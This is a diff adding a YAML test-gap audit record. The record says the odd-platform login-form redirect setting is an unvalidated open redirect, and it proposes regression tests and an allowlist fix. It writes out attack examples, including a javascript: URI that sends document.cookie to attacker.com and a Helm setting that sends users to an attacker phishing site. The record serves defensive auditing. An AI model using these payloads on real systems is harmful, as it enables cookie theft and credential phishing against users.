@@ -1,0 +1,66 @@
+gap_id: TEST-GAP-783
+category: missing-security
+criticality: HIGH
+node_ids:
+  - "odd-platform java LoginFormSecurityConfiguration config-class:LoginFormSecurityConfiguration"
+pillars_affected: [P-09]
+surfaced_by:
+  - "LoginFormSecurityConfiguration.md:bugs_limitations_corner_cases.[1] MEDIUM (auth.login-form-redirect open-redirect surface)"
+  - "LoginFormSecurityConfiguration.md:security.known_security_gaps.[2] MEDIUM (Open-redirect surface)"
+  - "LoginFormSecurityConfiguration.md:docs_link_semantic.doc_drift_findings.[0] (Live login-form docs page does NOT document auth.login-form-redirect)"
+behaviour: |-
+  **HIGH — `auth.login-form-redirect` is an open-redirect surface with no scheme/host/path validation. Combined with the doc absence (live `/configuration-and-deployment/enable-security/authentication/login-form` page DOES NOT mention this key), an operator who templates the value from an upstream pipeline introduces an attacker-controlled redirect target.** Sidecar primary-source confirms three composing facts:
+
+  - **LoginFormSecurityConfiguration.java:41**: `@Value("${auth.login-form-redirect:}")` reads the raw string from operator config; empty default falls back to `/`.
+  - **LoginFormSecurityConfiguration.java:89**: `URI.create(redirectUri)` parses the string — accepts ANY scheme (http, https, javascript, data, file, vbscript). Only validation is the URI parser's syntactic check.
+  - **LoginFormSecurityConfiguration.java:46**: `new DefaultServerRedirectStrategy().sendRedirect(exchange, redirectURI)` issues the 302 with the URI VERBATIM in the `Location` header.
+
+  No allowlist, no `@URL` constraint, no scheme check, no host check, no path-traversal check.
+
+  **Operator-impact scenarios** (templated-config attack vectors):
+  1. Helm chart with `helm install --set auth.loginFormRedirect=https://attacker.com` — every successful login redirects to attacker's site. The attacker site hosts a fake "Session expired, please re-authenticate" page and harvests credentials.
+  2. ConfigMap merged from a multi-tenant K8s namespace where the value is operator-controlled by a less-privileged user.
+  3. Env-var substitution `auth.login-form-redirect=${EXTERNAL_PORTAL_URL}` where `EXTERNAL_PORTAL_URL` is pulled from a CI/CD pipeline variable derived from a GitHub Actions input.
+  4. `javascript:alert(1)` or `javascript:fetch('https://attacker.com?cookie='+document.cookie)` — XSS-via-redirect if the browser honours non-http schemes in `Location` headers (some browsers do, depending on the response status).
+
+  **STRENGTHENS existing TEST-GAP-142** (also names the open-redirect surface from the same file). This sidecar adds the doc-drift dimension: WebFetched 2026-05-20 status 200 from `/configuration-and-deployment/enable-security/authentication/login-form` confirms the key is NOT mentioned in the live docs. Operators have NO guidance that this key is sensitive — the platform's docs surface gives no warning.
+
+  **No live-doc mitigation**: confirmed at primary source via WebFetch. The doc page covers `auth.type=LOGIN_FORM`, `auth.login-form-credentials`, security warnings about plaintext credentials — but the redirect key is silent.
+
+  **Test gap shape**: regression-pin asserting:
+  1. With `auth.login-form-redirect=https://attacker.com`, successful form-login returns HTTP 302 with `Location: https://attacker.com` (PINS current behaviour).
+  2. With `auth.login-form-redirect=javascript:alert(1)`, behaviour either crashes boot (preferred — fail-loud) or issues the redirect.
+  3. With `auth.login-form-redirect=` (empty), successful login redirects to `/` (existing TEST-GAP-142 path).
+
+  After the test pins the current behaviour, the fix is a one-method `validateRedirect(String)` that enforces an allowlist (same-origin OR explicit allowlist via `auth.login-form-redirect.allowed-origins`).
+test_files_existing: []
+test_files_proposed:
+  path: "odd-platform-api/src/test/java/org/opendatadiscovery/oddplatform/api/LoginFormRedirectOpenRedirectRegressionPinTest.java"
+  name: "loginFormSuccessRedirect_acceptsAttackerControlledUri_pinsOpenRedirectSurface_drivesAllowlist"
+evidence:
+  - "LoginFormSecurityConfiguration.md says (bugs_limitations_corner_cases.[1]): 'auth.login-form-redirect is an open-redirect surface — no validation, no allowlist. Line 41 reads the raw string with @Value, line 89 invokes URI.create(redirectUri) without validating scheme/host/path, and line 46 invokes new DefaultServerRedirectStrategy().sendRedirect(wfe.getExchange(), redirectURI). The redirect target is whatever the operator placed in configuration. In deployments where this value is templated from environment substitution (helm chart, K8s ConfigMap, Docker env-vars driven by upstream pipelines), there is no boundary that rejects an attacker-controlled value. The fetched login-form docs page does not mention login-form-redirect at all (WebFetched 2026-05-20).'"
+  - "LoginFormSecurityConfiguration.md says (security.known_security_gaps.[2]): 'Open-redirect surface — auth.login-form-redirect reaches DefaultServerRedirectStrategy.sendRedirect(...) with no scheme/host/path validation. Templated config values from untrusted upstream pipelines become attacker-controlled redirect targets.'"
+  - "LoginFormSecurityConfiguration.md says (docs_link_semantic.doc_drift_findings.[0]): 'The live login-form docs page does NOT document auth.login-form-redirect (WebFetched 2026-05-20, status 200).'"
+  - "Verified at primary source: LoginFormSecurityConfiguration.java:41 (@Value), L46 (sendRedirect), L89 (URI.create)"
+  - "WebFetch https://docs.opendatadiscovery.org/configuration-and-deployment/enable-security/authentication/login-form 2026-05-20 status 200 — confirms the doc does NOT mention the redirect key"
+cross_references:
+  - "TEST-GAP-142 (STRENGTHENED — was at config-key-consumer tier; this is config-class-tier primary source with doc-drift dimension added)"
+  - "DOC-GAP-NNN (proposed — live `/configuration-and-deployment/enable-security/authentication/login-form` MUST document `auth.login-form-redirect` AND warn about templated-config attack vectors)"
+  - "REFACTOR-NNN (proposed — add `validateRedirect(String)` enforcing allowlist OR scheme + host check; new config key `auth.login-form-redirect.allowed-origins: ['same-origin', 'https://trusted.example.com']`)"
+  - "concepts: open-redirect-on-login-success-templated-config-attack (NEW canonicalisation candidate)"
+related_features: [F-008]
+related_pillar_features: ["P-09:F-001 UI authentication"]
+proposed_action: |-
+  Add `LoginFormRedirectOpenRedirectRegressionPinTest` at `odd-platform-api/src/test/java/org/opendatadiscovery/oddplatform/api/`. Three test methods asserting the current open-redirect surface:
+
+  1. `loginFormSuccess_withAttackerControlledRedirect_returns302WithLocationHeaderVerbatim_pinsOpenRedirect` — `@SpringBootTest(properties = { "auth.type=LOGIN_FORM", "auth.login-form-redirect=https://attacker.com" })`; submit form-login as `admin:admin`; assert response status 302 AND `Location: https://attacker.com`. PINS the current open-redirect.
+
+  2. `loginFormSuccess_withJavascriptUri_eitherCrashesBootOrIssuesRedirect_documentsBrowserDependentXSSVector` — same fixture with `auth.login-form-redirect=javascript:alert(1)`; behaviour TBD by browser; documents the XSS-via-redirect surface.
+
+  3. `loginFormSuccess_withEmptyRedirect_returns302ToSlash` — same fixture with `auth.login-form-redirect=` (empty); assert `Location: /`. CONFIRMS the existing fallback (the only documented behaviour).
+
+  Add a `// OPEN-REDIRECT-PIN — auth.login-form-redirect accepts attacker-controlled URIs with no validation. Live docs do not mention the key (verified WebFetch 2026-05-20). This test pins the current behaviour until REFACTOR-NNN adds allowlist validation + the live doc is updated to warn operators about templated-config attack vectors.` comment block.
+
+  Pair with: (a) REFACTOR-NNN — add `auth.login-form-redirect.allowed-origins` config key + boot-time validation in LoginFormSecurityConfiguration.java:88-90; reject non-allowlisted URIs with `IllegalArgumentException` at boot; (b) DOC-GAP-NNN — live `/configuration-and-deployment/enable-security/authentication/login-form` MUST document the key AND warn about the templated-config attack class.
+batch: 2026-05-20-X
+feature_id: F-008
